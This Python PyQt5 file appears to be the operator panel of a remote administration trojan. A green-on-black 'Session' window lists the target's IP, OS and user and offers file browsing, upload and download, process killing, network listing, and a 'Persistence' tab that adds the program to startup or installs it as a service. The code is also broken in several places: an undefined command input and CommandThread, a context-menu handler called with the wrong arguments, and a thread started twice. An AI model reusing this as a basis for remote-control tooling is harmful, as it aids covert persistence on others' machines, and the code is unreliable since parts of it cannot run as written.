from PyQt5.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QLineEdit, QPushButton, QLabel,
    QSplitter, QTreeWidget, QTreeWidgetItem, QFileDialog,
    QMessageBox, QGroupBox, QGridLayout, QMenu, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QProgressBar,
    QInputDialog, QDialog, QDialogButtonBox, QFormLayout, QFrame
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QIcon, QColor, QFont
import json
import os
import subprocess
import threading
import shutil
import datetime
import socket
import platform
import psutil
import base64
import hashlib
import sys
import time
import tempfile
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import qdarkstyle
from .platform_utils import PlatformUtils

class SystemInfoThread(QThread):
    info_updated = pyqtSignal(dict)
    
    def __init__(self, session_id):
        super().__init__()
        self.session_id = session_id
        self.running = True
        
    def run(self):
        while self.running:
            try:
                info = PlatformUtils.get_system_info()
                self.info_updated.emit(info)
                time.sleep(5)  # Update every 5 seconds
            except Exception as e:
                print(f"Error gathering system info: {str(e)}")
                time.sleep(5)  # Still wait 5 seconds before retrying

class FileTransferThread(QThread):
    progress_updated = pyqtSignal(int)
    transfer_complete = pyqtSignal()
    error_occurred = pyqtSignal(str)
    
    def __init__(self, session_id, local_path, remote_path, is_upload=True):
        super().__init__()
        self.session_id = session_id
        self.local_path = local_path
        self.remote_path = remote_path
        self.is_upload = is_upload
        self.running = True
        
    def run(self):
        try:
            # Get total size for progress calculation
            total_size = os.path.getsize(self.local_path)
            chunk_size = 1024 * 1024  # 1MB chunks
            bytes_transferred = 0
            
            # Create destination directory if it doesn't exist
            os.makedirs(os.path.dirname(self.remote_path), exist_ok=True)
            
            # Perform the actual file transfer
            with open(self.local_path, 'rb') as source:
                with open(self.remote_path, 'wb') as dest:
                    while bytes_transferred < total_size and self.running:
                        chunk = source.read(chunk_size)
                        if not chunk:
                            break
                        dest.write(chunk)
                        bytes_transferred += len(chunk)
                        progress = int((bytes_transferred / total_size) * 100)
                        self.progress_updated.emit(progress)
                        
            if self.running:
                # Verify the transfer
                if os.path.getsize(self.remote_path) == total_size:
                    self.transfer_complete.emit()
                else:
                    self.error_occurred.emit("File transfer verification failed: size mismatch")
        except Exception as e:
            if self.running:
                self.error_occurred.emit(f"Error during file transfer: {str(e)}")
                # Clean up partial file if it exists
                try:
                    if os.path.exists(self.remote_path):
                        os.remove(self.remote_path)
                except:
                    pass
                
    def stop(self):
        self.running = False
        # Clean up partial file if transfer was stopped
        try:
            if os.path.exists(self.remote_path):
                os.remove(self.remote_path)
        except:
            pass

class SessionWindow(QMainWindow):
    def __init__(self, session_id, client_info):
        super().__init__()
        self.session_id = session_id
        self.client_info = client_info
        self.setWindowTitle(f"Session - {session_id}")
        self.setMinimumSize(1200, 800)
        self.encryption_key = Fernet.generate_key()
        self.last_seen = datetime.datetime.now()
        self.active_transfers = []  # Keep track of active transfers
        self.setup_ui()
        self.system_info_thread = SystemInfoThread(session_id)
        self.system_info_thread.info_updated.connect(self.update_system_info)
        self.system_info_thread.start()
        
    def setup_ui(self):
        # Create main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        layout.setSpacing(0)
        layout.setContentsMargins(0, 0, 0, 0)
        
        # Create header with session info
        header = QFrame()
        header.setStyleSheet("""
            QFrame {
                background-color: #0a0a0a;
                border-bottom: 1px solid #1a1a1a;
            }
            QLabel {
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
        """)
        header_layout = QHBoxLayout(header)
        header_layout.setContentsMargins(10, 5, 10, 5)
        
        # Session info with icons
        session_info = QLabel(f"Session {self.session_id}")
        ip_info = QLabel(f"● {self.client_info.get('ip', 'Unknown')}")
        os_info = QLabel(f"● {self.client_info.get('os', 'Unknown')}")
        user_info = QLabel(f"● {self.client_info.get('username', 'Unknown')}")
        
        # Add status indicator
        self.status_indicator = QLabel("●")
        self.status_indicator.setStyleSheet("color: #00ff00; font-size: 14px;")
        
        header_layout.addWidget(session_info)
        header_layout.addWidget(ip_info)
        header_layout.addWidget(os_info)
        header_layout.addWidget(user_info)
        header_layout.addStretch()
        header_layout.addWidget(self.status_indicator)
        
        layout.addWidget(header)
        
        # Create main content area
        content = QFrame()
        content.setStyleSheet("""
            QFrame {
                background-color: #0a0a0a;
            }
        """)
        content_layout = QHBoxLayout(content)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(0)
        
        # Create sidebar
        sidebar = QFrame()
        sidebar.setFixedWidth(200)
        sidebar.setStyleSheet("""
            QFrame {
                background-color: #0f0f0f;
                border-right: 1px solid #1a1a1a;
            }
            QPushButton {
                text-align: left;
                padding: 8px 15px;
                border: none;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #1a1a1a;
            }
            QPushButton:checked {
                background-color: #1a1a1a;
                border-left: 2px solid #00ff00;
            }
        """)
        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(0, 0, 0, 0)
        sidebar_layout.setSpacing(0)
        
        # Create sidebar buttons
        self.sidebar_buttons = []
        for tab_name in ["System Info", "File Manager", "Processes", "Network", "Persistence"]:
            btn = QPushButton(tab_name)
            btn.setCheckable(True)
            btn.clicked.connect(lambda checked, name=tab_name: self.switch_tab(name))
            sidebar_layout.addWidget(btn)
            self.sidebar_buttons.append(btn)
        
        sidebar_layout.addStretch()
        content_layout.addWidget(sidebar)
        
        # Create tab widget
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: none;
                background-color: #0a0a0a;
            }
            QTabBar::tab {
                display: none;
            }
        """)
        
        # Create tabs
        self.setup_system_info_tab()
        self.setup_file_manager_tab()
        self.setup_process_tab()
        self.setup_network_tab()
        self.setup_persistence_tab()
        
        content_layout.addWidget(self.tabs)
        layout.addWidget(content)
        
        # Apply custom dark theme
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a0a;
            }
            QWidget {
                background-color: #0a0a0a;
                color: #00ff00;
            }
            QPushButton {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 8px 16px;
                border-radius: 2px;
                min-width: 80px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #00ff00;
                color: #0a0a0a;
            }
            QPushButton:pressed {
                background-color: #00cc00;
                color: #0a0a0a;
            }
            QPushButton:disabled {
                background-color: #1a1a1a;
                color: #666666;
                border-color: #666666;
            }
            QLineEdit, QTextEdit {
                background-color: #0f0f0f;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 2px;
                padding: 4px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QTreeWidget, QTableWidget {
                background-color: #0a0a0a;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 2px;
                gridline-color: #1a1a1a;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QTreeWidget::item, QTableWidget::item {
                padding: 4px;
            }
            QTreeWidget::item:selected, QTableWidget::item:selected {
                background-color: #1a1a1a;
            }
            QHeaderView::section {
                background-color: #0f0f0f;
                color: #00ff00;
                padding: 4px;
                border: none;
                border-right: 1px solid #1a1a1a;
                border-bottom: 1px solid #1a1a1a;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QProgressBar {
                border: 1px solid #00ff00;
                background-color: #0f0f0f;
                text-align: center;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QProgressBar::chunk {
                background-color: #00ff00;
            }
            QGroupBox {
                border: 1px solid #00ff00;
                border-radius: 2px;
                margin-top: 1em;
                padding-top: 1em;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px;
                color: #00ff00;
            }
            QMenu {
                background-color: #0a0a0a;
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            QMenu::item {
                padding: 4px 20px;
            }
            QMenu::item:selected {
                background-color: #1a1a1a;
            }
        """)
        
        # Set initial tab
        self.sidebar_buttons[0].setChecked(True)
        self.tabs.setCurrentIndex(0)
        
        # Initialize file browser
        self.refresh_file_browser()
        
        # Start system info updates
        self.system_info_thread.start()
        
    def switch_tab(self, tab_name):
        # Update button states
        for btn in self.sidebar_buttons:
            btn.setChecked(btn.text() == tab_name)
            
        # Switch to corresponding tab
        tab_index = ["System Info", "File Manager", "Processes", "Network", "Persistence"].index(tab_name)
        self.tabs.setCurrentIndex(tab_index)
        
    def setup_system_info_tab(self):
        info_widget = QWidget()
        layout = QVBoxLayout(info_widget)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(5)
        
        # System Info Panel
        info_group = QGroupBox("System Information")
        info_layout = QFormLayout()
        
        # System details
        self.hostname_label = QLabel("Hostname: " + platform.node())
        self.ip_label = QLabel("IP: " + PlatformUtils.get_local_ip())
        self.os_label = QLabel("OS: " + platform.system() + " " + platform.release())
        self.username_label = QLabel("User: " + os.getlogin())
        self.last_seen_label = QLabel("Last Seen: " + self.last_seen.strftime("%Y-%m-%d %H:%M:%S"))
        
        info_layout.addRow("Hostname:", self.hostname_label)
        info_layout.addRow("IP:", self.ip_label)
        info_layout.addRow("OS:", self.os_label)
        info_layout.addRow("Username:", self.username_label)
        info_layout.addRow("Last Seen:", self.last_seen_label)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # CPU and Memory Usage
        usage_group = QGroupBox("Resource Usage")
        usage_layout = QGridLayout()
        
        self.cpu_label = QLabel("CPU Usage:")
        self.cpu_bar = QProgressBar()
        self.memory_label = QLabel("Memory Usage:")
        self.memory_bar = QProgressBar()
        
        usage_layout.addWidget(self.cpu_label, 0, 0)
        usage_layout.addWidget(self.cpu_bar, 0, 1)
        usage_layout.addWidget(self.memory_label, 1, 0)
        usage_layout.addWidget(self.memory_bar, 1, 1)
        
        usage_group.setLayout(usage_layout)
        layout.addWidget(usage_group)
        
        self.tabs.addTab(info_widget, "System Info")
        
    def setup_file_manager_tab(self):
        file_widget = QWidget()
        layout = QVBoxLayout(file_widget)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(5)
        
        # File browser controls
        controls_layout = QHBoxLayout()
        controls_layout.setSpacing(5)
        
        # Path input with custom style
        self.path_input = QLineEdit()
        self.path_input.setText(os.getcwd())
        self.path_input.setStyleSheet("""
            QLineEdit {
                background-color: #0f0f0f;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                padding: 4px;
            }
        """)
        
        # Buttons with icons
        refresh_button = QPushButton("↻")
        refresh_button.setFixedWidth(30)
        upload_button = QPushButton("↑")
        upload_button.setFixedWidth(30)
        download_button = QPushButton("↓")
        download_button.setFixedWidth(30)
        
        controls_layout.addWidget(QLabel("Path:"))
        controls_layout.addWidget(self.path_input, 1)
        controls_layout.addWidget(refresh_button)
        controls_layout.addWidget(upload_button)
        controls_layout.addWidget(download_button)
        
        # Connect signals
        refresh_button.clicked.connect(self.refresh_file_browser)
        upload_button.clicked.connect(self.upload_file)
        download_button.clicked.connect(self.download_file)
        
        layout.addLayout(controls_layout)
        
        # File tree with custom style
        self.file_tree = QTreeWidget()
        self.file_tree.setHeaderLabels(["Name", "Type", "Size", "Modified"])
        self.file_tree.setStyleSheet("""
            QTreeWidget {
                background-color: #0a0a0a;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 2px;
            }
            QTreeWidget::item {
                padding: 4px;
            }
            QTreeWidget::item:selected {
                background-color: #1a1a1a;
            }
            QHeaderView::section {
                background-color: #0f0f0f;
                color: #00ff00;
                padding: 4px;
                border: none;
                border-right: 1px solid #1a1a1a;
                border-bottom: 1px solid #1a1a1a;
            }
        """)
        self.file_tree.itemDoubleClicked.connect(self.handle_file_action)
        self.file_tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self.file_tree.customContextMenuRequested.connect(self.show_file_context_menu)
        layout.addWidget(self.file_tree)
        
        # Output area with custom style
        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setMaximumHeight(100)
        self.output_area.setStyleSheet("""
            QTextEdit {
                background-color: #0a0a0a;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                border: 1px solid #00ff00;
                border-radius: 2px;
            }
        """)
        layout.addWidget(self.output_area)
        
        # Progress bar with custom style
        self.transfer_progress = QProgressBar()
        self.transfer_progress.setVisible(False)
        self.transfer_progress.setStyleSheet("""
            QProgressBar {
                border: 1px solid #00ff00;
                background-color: #0f0f0f;
                text-align: center;
                color: #00ff00;
            }
            QProgressBar::chunk {
                background-color: #00ff00;
            }
        """)
        layout.addWidget(self.transfer_progress)
        
        self.tabs.addTab(file_widget, "File Manager")
        
    def setup_process_tab(self):
        process_widget = QWidget()
        layout = QVBoxLayout(process_widget)
        
        # Process table
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "User", "CPU %", "Memory %"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        
        # Process controls
        controls_layout = QHBoxLayout()
        refresh_button = QPushButton("Refresh")
        refresh_button.clicked.connect(self.refresh_processes)
        kill_button = QPushButton("Kill Process")
        kill_button.clicked.connect(self.kill_selected_process)
        
        controls_layout.addWidget(refresh_button)
        controls_layout.addWidget(kill_button)
        controls_layout.addStretch()
        
        layout.addLayout(controls_layout)
        layout.addWidget(self.process_table)
        
        self.tabs.addTab(process_widget, "Processes")
        
    def setup_network_tab(self):
        network_widget = QWidget()
        layout = QVBoxLayout(network_widget)
        
        # Network connections table
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(4)
        self.network_table.setHorizontalHeaderLabels(["Local Address", "Remote Address", "Status", "PID"])
        self.network_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        
        # Network controls
        controls_layout = QHBoxLayout()
        refresh_button = QPushButton("Refresh")
        refresh_button.clicked.connect(self.refresh_network)
        
        controls_layout.addWidget(refresh_button)
        controls_layout.addStretch()
        
        layout.addLayout(controls_layout)
        layout.addWidget(self.network_table)
        
        self.tabs.addTab(network_widget, "Network")
        
    def setup_persistence_tab(self):
        persistence_widget = QWidget()
        layout = QVBoxLayout(persistence_widget)
        
        # Persistence methods
        methods_group = QGroupBox("Persistence Methods")
        methods_layout = QVBoxLayout()
        
        # Startup
        startup_button = QPushButton("Add to Startup")
        startup_button.clicked.connect(self.add_to_startup)
        methods_layout.addWidget(startup_button)
        
        # Service
        service_button = QPushButton("Install as Service")
        service_button.clicked.connect(self.install_as_service)
        methods_layout.addWidget(service_button)
        
        methods_group.setLayout(methods_layout)
        layout.addWidget(methods_group)
        
        # Status area
        self.persistence_output = QTextEdit()
        self.persistence_output.setReadOnly(True)
        layout.addWidget(self.persistence_output)
        
        self.tabs.addTab(persistence_widget, "Persistence")
        
    def update_system_info(self, info):
        # Update CPU and Memory usage
        self.cpu_bar.setValue(int(info['cpu_percent']))
        self.memory_bar.setValue(int(info['memory']['percent']))
        
        # Update process table
        self.process_table.setRowCount(len(info['processes']))
        for i, proc in enumerate(info['processes']):
            self.process_table.setItem(i, 0, QTableWidgetItem(str(proc['pid'])))
            self.process_table.setItem(i, 1, QTableWidgetItem(proc['name']))
            self.process_table.setItem(i, 2, QTableWidgetItem(proc['username']))
            self.process_table.setItem(i, 3, QTableWidgetItem(f"{proc['cpu_percent']:.1f}%"))
            self.process_table.setItem(i, 4, QTableWidgetItem(f"{proc['memory_percent']:.1f}%"))
            
        # Update network table
        self.network_table.setRowCount(len(info['connections']))
        for i, conn in enumerate(info['connections']):
            self.network_table.setItem(i, 0, QTableWidgetItem(conn['local_addr']))
            self.network_table.setItem(i, 1, QTableWidgetItem(conn['remote_addr'] or ''))
            self.network_table.setItem(i, 2, QTableWidgetItem(conn['status']))
            self.network_table.setItem(i, 3, QTableWidgetItem(str(conn['pid'])))
            
    def add_to_startup(self):
        success, message = PlatformUtils.add_to_startup(sys.executable)
        self.persistence_output.append(message)
            
    def install_as_service(self):
        success, message = PlatformUtils.install_as_service(sys.executable)
        self.persistence_output.append(message)
            
    def kill_selected_process(self):
        selected_items = self.process_table.selectedItems()
        if not selected_items:
            return
            
        pid = int(self.process_table.item(selected_items[0].row(), 0).text())
        try:
            process = psutil.Process(pid)
            process.kill()
            self.refresh_processes()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to kill process: {str(e)}")
            
    def refresh_processes(self):
        self.system_info_thread.run()
        
    def refresh_network(self):
        self.system_info_thread.run()
        
    def closeEvent(self, event):
        # Stop system info thread
        self.system_info_thread.running = False
        self.system_info_thread.wait()
        
        # Stop all active transfers
        for transfer in self.active_transfers:
            transfer.running = False
            transfer.wait()
            
        event.accept()

    def refresh_file_browser(self):
        self.file_tree.clear()
        path = self.path_input.text()
        
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                tree_item = QTreeWidgetItem(self.file_tree)
                tree_item.setText(0, item)
                
                if os.path.isdir(full_path):
                    tree_item.setText(1, "Directory")
                    tree_item.setText(2, "")
                else:
                    tree_item.setText(1, "File")
                    size = os.path.getsize(full_path)
                    tree_item.setText(2, f"{size:,} bytes")
                    
                # Add modified time
                modified = datetime.datetime.fromtimestamp(os.path.getmtime(full_path))
                tree_item.setText(3, modified.strftime("%Y-%m-%d %H:%M:%S"))
                
        except Exception as e:
            self.output_area.append(f"Error refreshing file browser: {str(e)}")
            
    def handle_file_action(self, item, column):
        path = os.path.join(self.path_input.text(), item.text(0))
        if os.path.isdir(path):
            self.path_input.setText(path)
            self.refresh_file_browser()
        else:
            # Handle file actions
            self.show_file_context_menu(path, item)
            
    def show_file_context_menu(self, position):
        item = self.file_tree.itemAt(position)
        if not item:
            return
            
        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu {
                background-color: #0a0a0a;
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            QMenu::item {
                padding: 4px 20px;
            }
            QMenu::item:selected {
                background-color: #1a1a1a;
            }
        """)
        
        open_action = menu.addAction("Open")
        delete_action = menu.addAction("Delete")
        rename_action = menu.addAction("Rename")
        
        action = menu.exec(self.file_tree.viewport().mapToGlobal(position))
        
        if action == open_action:
            self.open_file(item)
        elif action == delete_action:
            self.delete_file(item)
        elif action == rename_action:
            self.rename_file(item)
            
    def open_file(self, item):
        path = os.path.join(self.path_input.text(), item.text(0))
        try:
            if PlatformUtils.is_windows():
                os.startfile(path)
            elif PlatformUtils.is_linux():
                subprocess.run(['xdg-open', path])
            elif PlatformUtils.is_macos():
                subprocess.run(['open', path])
        except Exception as e:
            self.output_area.append(f"Error opening file: {str(e)}")
            
    def delete_file(self, item):
        path = os.path.join(self.path_input.text(), item.text(0))
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
            self.refresh_file_browser()
        except Exception as e:
            self.output_area.append(f"Error deleting file: {str(e)}")
            
    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            try:
                target_path = os.path.join(self.path_input.text(), os.path.basename(file_path))
                transfer = FileTransferThread(
                    session_id=self.session_id,
                    local_path=file_path,
                    remote_path=target_path,
                    is_upload=True
                )
                transfer.progress_updated.connect(self.transfer_progress.setValue)
                transfer.transfer_complete.connect(self.on_transfer_complete)
                transfer.error_occurred.connect(self.on_transfer_error)
                transfer.finished.connect(lambda: self.active_transfers.remove(transfer))  # Remove from active transfers when done
                self.active_transfers.append(transfer)  # Add to active transfers
                self.transfer_progress.setVisible(True)
                transfer.start()
            except Exception as e:
                self.output_area.append(f"Error uploading file: {str(e)}")
                
    def download_file(self, source_path=None):
        if not source_path:
            selected_items = self.file_tree.selectedItems()
            if not selected_items:
                return
            source_path = os.path.join(self.path_input.text(), selected_items[0].text(0))
            
        target_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save File",
            os.path.basename(source_path)
        )
        
        if target_path:
            try:
                transfer = FileTransferThread(
                    session_id=self.session_id,
                    local_path=source_path,
                    remote_path=target_path,
                    is_upload=False
                )
                transfer.progress_updated.connect(self.transfer_progress.setValue)
                transfer.transfer_complete.connect(self.on_transfer_complete)
                transfer.error_occurred.connect(self.on_transfer_error)
                transfer.finished.connect(lambda: self.active_transfers.remove(transfer))  # Remove from active transfers when done
                self.active_transfers.append(transfer)  # Add to active transfers
                self.transfer_progress.setVisible(True)
                transfer.start()
            except Exception as e:
                self.output_area.append(f"Error downloading file: {str(e)}")
                
    def on_transfer_complete(self):
        self.transfer_progress.setVisible(False)
        self.output_area.append("File transfer completed successfully")
        self.refresh_file_browser()
        
    def on_transfer_error(self, error_msg):
        self.transfer_progress.setVisible(False)
        self.output_area.append(f"Error during file transfer: {error_msg}")

    def execute_command(self):
        command = self.command_input.text()
        if not command:
            return
            
        self.output_area.append(f"\n> {command}")
        self.command_input.clear()
        
        # Execute command in a separate thread
        thread = CommandThread(command)
        thread.output.connect(self.handle_command_output)
        thread.start()
        
    def handle_command_output(self, output):
        self.output_area.append(output)
        # Auto-scroll to bottom
        self.output_area.verticalScrollBar().setValue(
            self.output_area.verticalScrollBar().maximum()
        )
        
    def update_last_seen(self):
        self.last_seen = datetime.datetime.now()
        self.status_indicator.setStyleSheet("color: #00ff00; font-size: 14px;")
        QTimer.singleShot(5000, lambda: self.status_indicator.setStyleSheet("color: #ff0000; font-size: 14px;")) 